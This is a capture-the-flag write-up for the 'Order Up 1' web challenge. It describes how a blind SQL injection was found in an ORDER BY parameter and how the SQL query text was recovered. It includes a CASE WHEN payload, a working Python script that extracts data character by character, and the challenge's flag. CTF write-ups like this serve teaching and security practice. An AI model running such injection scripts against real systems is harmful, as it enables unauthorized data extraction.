## Title 

Order Up 1

## Description

I hope my under construction web site is secure.

Solving this will unlock a series of related challenges that ALL use the same challenge instance.

To find the first flag, find a way to view the text of the SQL query.

If you find some other flag, it will be related to one of the others in this series.

## Solution

When we access the URL we get a list of items that we can order.
Looking at it with burp, two requests are sent:
    - one GET request for the endpoint
    - one GET request for the endpoint `/query` with the following parameters: `col1=category&col2=item_name&col3=description&col4=price&order=category,item_name` 

If we try to change the columns names like: `GET /query?col1=cateagory&col2=iteam_name&col3=descaription&col4=priace&order=category,item_name`
We get: `Invalid column names provided`. This is a indication that they are the columns of a sql table. 
However when we try to change the order parameter with: `order=category,item_name'`
We get: `500 Internal Server Error`, and this is a good indication of injection because the server is not handling well our input.


*Exploiting SQL injection in an ORDER BY clause is significantly different from most other cases. A database will not accept a UNION, WHERE, OR, or AND keyword at this point in the query. Exploitation requires the attacker to specify a nested query in place of the ORDER BY parameter identified above. * [https://portswigger.net/support/sql-injection-in-the-query-structure]()

In the above link, they give an example on how to extract information one letter at a time using the following payload: `(CASE WHEN (SELECT ASCII(SUBSTRING(username, 1, 1)) FROM users where id='5')=80 THEN username ELSE id END) where 80 is one of the letters we are comparing.

So, since we don't have much info about the table, database or query we will start by the query and start extracting the query that is used here.
In order to verify if the letter is correct we will order for item_name, first being `"item_name":"BBQ Pulled Pork Sandwich"`, if not, order by category.
For that we will use current_query(), `python3 exploit.py https://dyn-svc-order-up-kxdfoyp940qjbhy2x1pl-okntin33tq-ul.a.run.app "current_query()"`:

```py
import requests
import json
import string
import sys

a = string.printable
s = ""
url = sys.argv[1] + "/query"
for i in range(1,100):
    for j in a:
        data = {
            "col1":"item_name",
            "order":f" (case when (ascii(substr({sys.argv[2]},{i},1))={ord(j)}) then item_name else category end)"
            #(case when (ascii(substr(current_database(),0,1))>0) then item_name else category end)
        }
        r=requests.get(url,params=data)
        if json.loads(r.text)[0]["item_name"] == "BBQ Pulled Pork Sandwich":
            print("ok")
            s+=j
            print(s)
            break
        else:
            print(f"[{j}]: Not OK")
```

There is a walkthrough made by the creator here: [https://github.com/sambrow/my_ctf_challenges/blob/main/wolvsec_ctf_2024/order-up/WALKTHROUGH_ORDERUP1.md]().
We get the query: `SELECT item_name from /*wctf{0rd3r_by_1nj3ct10n_1s_fun_09376523465}*/ menu_items order by  (case wh`